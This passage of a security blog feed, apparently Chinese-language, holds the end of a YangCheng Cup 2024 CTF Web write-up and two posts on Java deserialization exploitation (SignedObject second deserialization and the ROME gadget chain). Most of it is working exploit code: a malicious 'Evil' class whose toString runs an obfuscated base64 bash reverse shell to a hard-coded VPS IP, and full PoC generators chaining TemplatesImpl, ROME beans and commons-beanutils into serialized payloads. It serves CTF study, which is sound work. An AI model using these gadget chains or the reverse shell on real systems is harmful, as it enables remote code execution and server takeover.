class="string">&quot;value&quot;</span>);</span><br><span class="line">                valueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                valueField.set(node, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>vps上的恶意类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打成jar包 放在http服务等待获取</p><p>vps同时监听反弹shell端口即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;羊城杯2024-Web-题解&quot;&gt;&lt;a href=&quot;#羊城杯2024-Web-题解&quot; class=&quot;headerlink&quot; title=&quot;羊城杯2024 Web 题解&quot;&gt;&lt;/a&gt;羊城杯2024 Web 题解&lt;/h1&gt;&lt;p&gt;总算没有爆零, 解出了两题, ez_java</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二次反序列化</title>
    <link href="http://example.com/2024/08/21/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/08/21/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-21T05:44:37.000Z</published>
    <updated>2024-08-21T13:55:26.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="认识"><a href="#认识" class="headerlink" title="认识"></a>认识</h2><p>首先利用到的是<code>java.security</code> 这个包</p><p><code>java.security</code> 包是 Java 平台中用于提供安全框架和各种安全功能的核心包。它包含了用于管理和实现安全性相关的类和接口，例如加密、数字签名、密钥管理、访问控制、认证和权限等。这个包中的类广泛用于保护数据和应用程序的安全性。</p><p>简单介绍下二次反序列化，顾名思义，就是反序列化两次，其主要意义是绕过<strong>黑名单的限制或不出网利用</strong></p><h2 id="利用连"><a href="#利用连" class="headerlink" title="利用连"></a>利用连</h2><h3 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h3><p>在<code>java.security.SignedObject</code>这个类中, 构造器将传入的可序列化对象进行了一次序列化</p><p><code>getObject</code>方法又对构造器序列化后的对象(<code>this.content</code>)进行了反序列化 如下图:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821142310512.png" alt="image-20240821142310512"></p><p>而这个<code>getObject</code>很明显就是一个getter, 那么就可以配合之前的Rome链, CB1链来调用</p><p>根据它的构造器. 利用下面这种方式来创建实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(恶意对象,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结合rome链"><a href="#结合rome链" class="headerlink" title="结合rome链"></a>结合rome链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.ShellCode.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">evilHashMap</span> <span class="operator">=</span> getEvilObj();</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilHashMap,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getEvilObj</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="comment">// EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结合commons-beanutils链"><a href="#结合commons-beanutils链" class="headerlink" title="结合commons-beanutils链"></a>结合commons-beanutils链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.ShellCode.getEvilTemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUnserial2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">evilHashMap</span> <span class="operator">=</span> getEvilObj();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilHashMap,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;object&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;signedObject, <span class="number">1</span>&#125;);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, beanComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(priorityQueue);</span><br><span class="line"></span><br><span class="line">        string2file(poc, <span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getEvilObj</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="comment">// EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里getEvilObj可以是任何一条完整的反序列化链条,只要有对应的依赖即可</p><p>当然也可以使用CC来调用getObject方法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;认识&quot;&gt;&lt;a href=&quot;#认识&quot; class=&quot;headerlink&quot; title=&quot;认识&quot;&gt;&lt;/a&gt;认识&lt;/h2&gt;&lt;p&gt;首先利用到的是&lt;code&gt;java.security&lt;/code&gt; 这个包&lt;/p&gt;
&lt;p&gt;&lt;code&gt;java.security&lt;/code</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化之ROME反序列化</title>
    <link href="http://example.com/2024/08/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/08/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-20T10:21:08.000Z</published>
    <updated>2024-08-31T04:43:58.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是ROME"><a href="#什么是ROME" class="headerlink" title="什么是ROME"></a>什么是ROME</h2><p>简单来说, ROME工具库实现Java对象和XML数据之间的转换</p><h2 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h2><p>依然使用 jdk8u65</p><p>rome依赖:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ROME反序列化使用动态字节码加载也就是我们熟悉的TemplatesImpl这个类来组成gadget</p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>在CB1链中已经知道了TemplatesImpl#getOutputProperties这个getter方法会触发newITransformer方法导致类加载, 实际上这里也是同样的原理, 不同的只是谁来调用这个getter</p><h3 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h3><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820183813233.png" alt="image-20240820183813233"></p><p>这里的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br></pre></td></tr></table></figure><p>用来获取一个类的getter, 之后的for循环对这些getter进行了调用. 虽然这个方法是private, 但它的一个重载无参public方法对其进行了调用</p><p>那么接下来就是寻找toString在哪里调用了</p><p>ROME中有一个EqualsBean类它的hashcode方法间接调用了toString方法, 且这里的<code>_obj</code>可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820185015385.png" alt="image-20240820185015385"></p><p>之后套上hashMap的hashcode方法, 链子就完整了</p><p>那么就可以编写poc了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h3><p><code>ObjectBean</code>的hashCode方法直接调用了<code>_equalsBean.hashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _equalsBean.beanHashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下它的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectBean</span><span class="params">(Class beanClass,Object obj,Set ignoreProperties)</span> &#123;</span><br><span class="line">    _equalsBean = <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(beanClass,obj);</span><br><span class="line">    _toStringBean = <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(beanClass,obj);</span><br><span class="line">    _cloneableBean = <span class="keyword">new</span> <span class="title class_">CloneableBean</span>(obj,ignoreProperties);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接创建了一个<code>EqualsBean</code>, 那么这个类就可以替换掉刚刚手动创建的的<code>EqualsBean</code></p><p>链子如下:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820202630402.png" alt="image-20240820202630402"></p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//  EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span 